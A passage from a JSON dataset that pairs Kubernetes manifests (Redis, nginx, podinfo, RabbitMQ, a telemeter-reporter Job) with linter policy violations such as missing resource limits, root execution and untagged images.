initialDelaySeconds: 5\n          timeoutSeconds: 6\n          periodSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - /health/ping_readiness.sh 1\n          initialDelaySeconds: 5\n          timeoutSeconds: 2\n          periodSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        env:\n        - name: REDIS_PORT\n          value: '6379'\n        - name: REDIS_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: redis-secrets\n              key: redis_password\n      volumes:\n      - name: redis-healthcheck\n        configMap:\n          name: redis-healthcheck\n          defaultMode: 493\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis\" has memory limit 0"
  },
  {
    "id": "11044",
    "manifest_path": "data/manifests/the_stack_sample/sample_4239.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9689\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11045",
    "manifest_path": "data/manifests/the_stack_sample/sample_4239.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9689\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11046",
    "manifest_path": "data/manifests/the_stack_sample/sample_4239.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9689\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11047",
    "manifest_path": "data/manifests/the_stack_sample/sample_4239.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9689\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11048",
    "manifest_path": "data/manifests/the_stack_sample/sample_4239.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9689\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11049",
    "manifest_path": "data/manifests/the_stack_sample/sample_4242.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    job-name: telemeter-reporter-initjob\n  name: telemeter-reporter-initjob\n  namespace: sd-sre\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - telemeter-reporter --log info --format html --format csv --parents --minify\n          /telemeter-reporter-storage/reports/$(date +\"%Y-%m/%F.28dSLOReport\")\n        env:\n        - name: TELEMETER_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: telemeterToken\n              name: telemeter-reporter-secret\n        - name: UHC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: uhcToken\n              name: telemeter-reporter-secret\n        - name: TELEMETER_REPORTER_CONFIG\n          value: /telemeter-reporter-config/reporter_conf.yml\n        - name: TELEMETER_SSL_CA\n          value: /telemeter-reporter-config/RHCertBundle.pem\n        image: docker-registry.default.svc:5000/sd-sre/telemeter-reporter\n        imagePullPolicy: Always\n        name: telemeter-reporter-initjob\n        resources: {}\n        volumeMounts:\n        - mountPath: /telemeter-reporter-config\n          name: config-volume\n        - mountPath: /telemeter-reporter-storage\n          name: telemeter-reporter-storage\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: telemeter-reporter-config\n        name: config-volume\n      - name: telemeter-reporter-storage\n        persistentVolumeClaim:\n          claimName: telemeter-reporter-storage-claim\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "11050",
    "manifest_path": "data/manifests/the_stack_sample/sample_4242.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    job-name: telemeter-reporter-initjob\n  name: telemeter-reporter-initjob\n  namespace: sd-sre\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - telemeter-reporter --log info --format html --format csv --parents --minify\n          /telemeter-reporter-storage/reports/$(date +\"%Y-%m/%F.28dSLOReport\")\n        env:\n        - name: TELEMETER_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: telemeterToken\n              name: telemeter-reporter-secret\n        - name: UHC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: uhcToken\n              name: telemeter-reporter-secret\n        - name: TELEMETER_REPORTER_CONFIG\n          value: /telemeter-reporter-config/reporter_conf.yml\n        - name: TELEMETER_SSL_CA\n          value: /telemeter-reporter-config/RHCertBundle.pem\n        image: docker-registry.default.svc:5000/sd-sre/telemeter-reporter\n        imagePullPolicy: Always\n        name: telemeter-reporter-initjob\n        resources: {}\n        volumeMounts:\n        - mountPath: /telemeter-reporter-config\n          name: config-volume\n        - mountPath: /telemeter-reporter-storage\n          name: telemeter-reporter-storage\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: telemeter-reporter-config\n        name: config-volume\n      - name: telemeter-reporter-storage\n        persistentVolumeClaim:\n          claimName: telemeter-reporter-storage-claim\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"telemeter-reporter-initjob\" is using an invalid container image, \"docker-registry.default.svc:5000/sd-sre/telemeter-reporter\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11051",
    "manifest_path": "data/manifests/the_stack_sample/sample_4242.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    job-name: telemeter-reporter-initjob\n  name: telemeter-reporter-initjob\n  namespace: sd-sre\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - telemeter-reporter --log info --format html --format csv --parents --minify\n          /telemeter-reporter-storage/reports/$(date +\"%Y-%m/%F.28dSLOReport\")\n        env:\n        - name: TELEMETER_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: telemeterToken\n              name: telemeter-reporter-secret\n        - name: UHC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: uhcToken\n              name: telemeter-reporter-secret\n        - name: TELEMETER_REPORTER_CONFIG\n          value: /telemeter-reporter-config/reporter_conf.yml\n        - name: TELEMETER_SSL_CA\n          value: /telemeter-reporter-config/RHCertBundle.pem\n        image: docker-registry.default.svc:5000/sd-sre/telemeter-reporter\n        imagePullPolicy: Always\n        name: telemeter-reporter-initjob\n        resources: {}\n        volumeMounts:\n        - mountPath: /telemeter-reporter-config\n          name: config-volume\n        - mountPath: /telemeter-reporter-storage\n          name: telemeter-reporter-storage\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: telemeter-reporter-config\n        name: config-volume\n      - name: telemeter-reporter-storage\n        persistentVolumeClaim:\n          claimName: telemeter-reporter-storage-claim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"telemeter-reporter-initjob\" does not have a read-only root file system"
  },
  {
    "id": "11052",
    "manifest_path": "data/manifests/the_stack_sample/sample_4242.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    job-name: telemeter-reporter-initjob\n  name: telemeter-reporter-initjob\n  namespace: sd-sre\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - telemeter-reporter --log info --format html --format csv --parents --minify\n          /telemeter-reporter-storage/reports/$(date +\"%Y-%m/%F.28dSLOReport\")\n        env:\n        - name: TELEMETER_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: telemeterToken\n              name: telemeter-reporter-secret\n        - name: UHC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: uhcToken\n              name: telemeter-reporter-secret\n        - name: TELEMETER_REPORTER_CONFIG\n          value: /telemeter-reporter-config/reporter_conf.yml\n        - name: TELEMETER_SSL_CA\n          value: /telemeter-reporter-config/RHCertBundle.pem\n        image: docker-registry.default.svc:5000/sd-sre/telemeter-reporter\n        imagePullPolicy: Always\n        name: telemeter-reporter-initjob\n        resources: {}\n        volumeMounts:\n        - mountPath: /telemeter-reporter-config\n          name: config-volume\n        - mountPath: /telemeter-reporter-storage\n          name: telemeter-reporter-storage\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: telemeter-reporter-config\n        name: config-volume\n      - name: telemeter-reporter-storage\n        persistentVolumeClaim:\n          claimName: telemeter-reporter-storage-claim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"telemeter-reporter-initjob\" is not set to runAsNonRoot"
  },
  {
    "id": "11053",
    "manifest_path": "data/manifests/the_stack_sample/sample_4242.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    job-name: telemeter-reporter-initjob\n  name: telemeter-reporter-initjob\n  namespace: sd-sre\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - telemeter-reporter --log info --format html --format csv --parents --minify\n          /telemeter-reporter-storage/reports/$(date +\"%Y-%m/%F.28dSLOReport\")\n        env:\n        - name: TELEMETER_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: telemeterToken\n              name: telemeter-reporter-secret\n        - name: UHC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: uhcToken\n              name: telemeter-reporter-secret\n        - name: TELEMETER_REPORTER_CONFIG\n          value: /telemeter-reporter-config/reporter_conf.yml\n        - name: TELEMETER_SSL_CA\n          value: /telemeter-reporter-config/RHCertBundle.pem\n        image: docker-registry.default.svc:5000/sd-sre/telemeter-reporter\n        imagePullPolicy: Always\n        name: telemeter-reporter-initjob\n        resources: {}\n        volumeMounts:\n        - mountPath: /telemeter-reporter-config\n          name: config-volume\n        - mountPath: /telemeter-reporter-storage\n          name: telemeter-reporter-storage\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: telemeter-reporter-config\n        name: config-volume\n      - name: telemeter-reporter-storage\n        persistentVolumeClaim:\n          claimName: telemeter-reporter-storage-claim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"telemeter-reporter-initjob\" has cpu request 0"
  },
  {
    "id": "11054",
    "manifest_path": "data/manifests/the_stack_sample/sample_4242.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    job-name: telemeter-reporter-initjob\n  name: telemeter-reporter-initjob\n  namespace: sd-sre\nspec:\n  template:\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - telemeter-reporter --log info --format html --format csv --parents --minify\n          /telemeter-reporter-storage/reports/$(date +\"%Y-%m/%F.28dSLOReport\")\n        env:\n        - name: TELEMETER_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: telemeterToken\n              name: telemeter-reporter-secret\n        - name: UHC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: uhcToken\n              name: telemeter-reporter-secret\n        - name: TELEMETER_REPORTER_CONFIG\n          value: /telemeter-reporter-config/reporter_conf.yml\n        - name: TELEMETER_SSL_CA\n          value: /telemeter-reporter-config/RHCertBundle.pem\n        image: docker-registry.default.svc:5000/sd-sre/telemeter-reporter\n        imagePullPolicy: Always\n        name: telemeter-reporter-initjob\n        resources: {}\n        volumeMounts:\n        - mountPath: /telemeter-reporter-config\n          name: config-volume\n        - mountPath: /telemeter-reporter-storage\n          name: telemeter-reporter-storage\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: telemeter-reporter-config\n        name: config-volume\n      - name: telemeter-reporter-storage\n        persistentVolumeClaim:\n          claimName: telemeter-reporter-storage-claim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"telemeter-reporter-initjob\" has memory limit 0"
  },
  {
    "id": "11055",
    "manifest_path": "data/manifests/the_stack_sample/sample_4245.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Greetings JihemB!\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "11056",
    "manifest_path": "data/manifests/the_stack_sample/sample_4245.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Greetings JihemB!\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfod\" does not have a read-only root file system"
  },
  {
    "id": "11057",
    "manifest_path": "data/manifests/the_stack_sample/sample_4245.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Greetings JihemB!\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init\" is not set to runAsNonRoot"
  },
  {
    "id": "11058",
    "manifest_path": "data/manifests/the_stack_sample/sample_4245.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Greetings JihemB!\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfod\" is not set to runAsNonRoot"
  },
  {
    "id": "11059",
    "manifest_path": "data/manifests/the_stack_sample/sample_4245.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Greetings JihemB!\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init\" has cpu request 0"
  },
  {
    "id": "11060",
    "manifest_path": "data/manifests/the_stack_sample/sample_4245.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Greetings JihemB!\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init\" has memory limit 0"
  },
  {
    "id": "11061",
    "manifest_path": "data/manifests/the_stack_sample/sample_4247.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: hello-go\n  namespace: default\n  labels:\n    name: hello-go\nspec:\n  ports:\n  - port: 80\n    targetPort: 8080\n    protocol: TCP\n  selector:\n    app: hello-go\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:hello-go])"
  },
  {
    "id": "11062",
    "manifest_path": "data/manifests/the_stack_sample/sample_4249.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: rabbitmq\n  labels:\n    app: rabbitmq\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rabbitmq\n  template:\n    metadata:\n      labels:\n        app: rabbitmq\n    spec:\n      serviceAccountName: rabbitmq\n      containers:\n      - name: rabbitmq\n        image: docker.io/bitnami/rabbitmq:3.8.3-debian-10-r79\n        imagePullPolicy: IfNotPresent\n        command:\n        - bash\n        - -ec\n        - 'mkdir -p /opt/bitnami/rabbitmq/.rabbitmq/\n\n          mkdir -p /opt/bitnami/rabbitmq/etc/rabbitmq/\n\n          touch /opt/bitnami/rabbitmq/var/lib/rabbitmq/.start\n\n          #persist the erlang cookie in both places for server and cli tools\n\n          echo $RABBITMQ_ERL_COOKIE > /opt/bitnami/rabbitmq/var/lib/rabbitmq/.erlang.cookie\n\n          cp /opt/bitnami/rabbitmq/var/lib/rabbitmq/.erlang.cookie /opt/bitnami/rabbitmq/.rabbitmq/\n\n          #change permission so only the user has access to the cookie file\n\n          chmod 600 /opt/bitnami/rabbitmq/.rabbitmq/.erlang.cookie /opt/bitnami/rabbitmq/var/lib/rabbitmq/.erlang.cookie\n\n          #copy the mounted configuration to both places\n\n          cp  /opt/bitnami/rabbitmq/conf/* /opt/bitnami/rabbitmq/etc/rabbitmq\n\n          # Apply resources limits\n\n          ulimit -n \"${RABBITMQ_ULIMIT_NOFILES}\"\n\n          #replace the default password that is generated\n\n          sed -i \"/CHANGEME/cdefault_pass=${RABBITMQ_PASSWORD//\\\\/\\\\\\\\}\" /opt/bitnami/rabbitmq/etc/rabbitmq/rabbitmq.conf\n\n          exec rabbitmq-server\n\n          '\n        volumeMounts:\n        - name: config-volume\n          mountPath: /opt/bitnami/rabbitmq/conf\n        - name: healthchecks\n          mountPath: /usr/local/sbin/rabbitmq-api-check\n          subPath: rabbitmq-api-check\n        - name: healthchecks\n          mountPath: /usr/local/sbin/rabbitmq-health-check\n          subPath: rabbitmq-health-check\n        - name: data\n          mountPath: /opt/bitnami/rabbitmq/var/lib/rabbitmq\n        ports:\n        - name: epmd\n          containerPort: 4369\n        - name: amqp\n          containerPort: 5672\n        - name: dist\n          containerPort: 25672\n        - name: stats\n          containerPort: 15672\n        livenessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - rabbitmq-api-check \"http://user:$RABBITMQ_PASSWORD@127.0.0.1:15672/api/healthchecks/node\"\n              '{\"status\":\"ok\"}'\n          initialDelaySeconds: 120\n          timeoutSeconds: 20\n          periodSeconds: 30\n          failureThreshold: 6\n          successThreshold: 1\n        readinessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - rabbitmq-health-check \"http://user:$RABBITMQ_PASSWORD@127.0.0.1:15672/api/healthchecks/node\"\n              '{\"status\":\"ok\"}'\n          initialDelaySeconds: 10\n          timeoutSeconds: 20\n          periodSeconds: 30\n          failureThreshold: 3\n          successThreshold: 1\n        env:\n        - name: BITNAMI_DEBUG\n          value: 'false'\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: K8S_SERVICE_NAME\n          value: rabbitmq-headless\n        - name: K8S_ADDRESS_TYPE\n          value: hostname\n        - name: RABBITMQ_NODENAME\n          value: rabbit@$(MY_POD_NAME).$(K8S_SERVICE_NAME).$(MY_POD_NAMESPACE).svc.cluster.local\n        - name: K8S_HOSTNAME_SUFFIX\n          value: .$(K8S_SERVICE_NAME).$(MY_POD_NAMESPACE).svc.cluster.local\n        - name: RABBITMQ_LOGS\n          value: '-'\n        - name: RABBITMQ_ULIMIT_NOFILES\n          value: '65536'\n        - name: RABBITMQ_USE_LONGNAME\n          value: 'true'\n        - name: RABBITMQ_ERL_COOKIE\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq\n              key: rabbitmq-erlang-cookie\n        - name: RABBITMQ_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq\n              key: rabbitmq-password\n      securityContext:\n        fsGroup: 1001\n        runAsUser: 1001\n      volumes:\n      - name: config-volume\n        configMap:\n          name: rabbitmq-config\n          items:\n          - key: rabbitmq.conf\n            path: rabbitmq.conf\n          - key: enabled_plugins\n            path: enabled_plugins\n      - name: healthchecks\n        configMap:\n          name: rabbitmq-healthchecks\n          items:\n          - key: rabbitmq-health-check\n            path: rabbitmq-health-check\n            mode: 111\n          - key: rabbitmq-api-check\n            path: rabbitmq-api-check\n            mode: 111\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rabbitmq\" does not have a read-only root file system"
  },
  {
    "id": "11063",
    "manifest_path": "data/manifests/the_stack_sample/sample_4249.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: rabbitmq\n  labels:\n    app: rabbitmq\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rabbitmq\n  template:\n    metadata:\n      labels:\n        app: rabbitmq\n    spec:\n      serviceAccountName: rabbitmq\n      containers:\n      - name: rabbitmq\n        image: docker.io/bitnami/rabbitmq:3.8.3-debian-10-r79\n        imagePullPolicy: IfNotPresent\n        command:\n        - bash\n        - -ec\n        - 'mkdir -p /opt/bitnami/rabbitmq/.rabbitmq/\n\n          mkdir -p /opt/bitnami/rabbitmq/etc/rabbitmq/\n\n          touch /opt/bitnami/rabbitmq/var/lib/rabbitmq/.start\n\n          #persist the erlang cookie in both places for server and cli tools\n\n          echo $RABBITMQ_ERL_COOKIE > /opt/bitnami/rabbitmq/var/lib/rabbitmq/.erlang.cookie\n\n          cp /opt/bitnami/rabbitmq/var/lib/rabbitmq/.erlang.cookie /opt/bitnami/rabbitmq/.rabbitmq/\n\n          #change permission so only the user has access to the cookie file\n\n          chmod 600 /opt/bitnami/rabbitmq/.rabbitmq/.erlang.cookie /opt/bitnami/rabbitmq/var/lib/rabbitmq/.erlang.cookie\n\n          #copy the mounted configuration to both places\n\n          cp  /opt/bitnami/rabbitmq/conf/* /opt/bitnami/rabbitmq/etc/rabbitmq\n\n          # Apply resources limits\n\n          ulimit -n \"${RABBITMQ_ULIMIT_NOFILES}\"\n\n          #replace the default password that is generated\n\n          sed -i \"/CHANGEME/cdefault_pass=${RABBITMQ_PASSWORD//\\\\/\\\\\\\\}\" /opt/bitnami/rabbitmq/etc/rabbitmq/rabbitmq.conf\n\n          exec rabbitmq-server\n\n          '\n        volumeMounts:\n        - name: config-volume\n          mountPath: /opt/bitnami/rabbitmq/conf\n        - name: healthchecks\n          mountPath: /usr/local/sbin/rabbitmq-api-check\n          subPath: rabbitmq-api-check\n        - name: healthchecks\n          mountPath: /usr/local/sbin/rabbitmq-health-check\n          subPath: rabbitmq-health-check\n        - name: data\n          mountPath: /opt/bitnami/rabbitmq/var/lib/rabbitmq\n        ports:\n        - name: epmd\n          containerPort: 4369\n        - name: amqp\n          containerPort: 5672\n        - name: dist\n          containerPort: 25672\n        - name: stats\n          containerPort: 15672\n        livenessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - rabbitmq-api-check \"http://user:$RABBITMQ_PASSWORD@127.0.0.1:15672/api/healthchecks/node\"\n              '{\"status\":\"ok\"}'\n          initialDelaySeconds: 120\n          timeoutSeconds: 20\n          periodSeconds: 30\n          failureThreshold: 6\n          successThreshold: 1\n        readinessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - rabbitmq-health-check \"http://user:$RABBITMQ_PASSWORD@127.0.0.1:15672/api/healthchecks/node\"\n              '{\"status\":\"ok\"}'\n          initialDelaySeconds: 10\n          timeoutSeconds: 20\n          periodSeconds: 30\n          failureThreshold: 3\n          successThreshold: 1\n        env:\n        - name: BITNAMI_DEBUG\n          value: 'false'\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: K8S_SERVICE_NAME\n          value: rabbitmq-headless\n        - name: K8S_ADDRESS_TYPE\n          value: hostname\n        - name: RABBITMQ_NODENAME\n          value: rabbit@$(MY_POD_NAME).$(K8S_SERVICE_NAME).$(MY_POD_NAMESPACE).svc.cluster.local\n        - name: K8S_HOSTNAME_SUFFIX\n          value: .$(K8S_SERVICE_NAME).$(MY_POD_NAMESPACE).svc.cluster.local\n        - name: RABBITMQ_LOGS\n          value: '-'\n        - name: 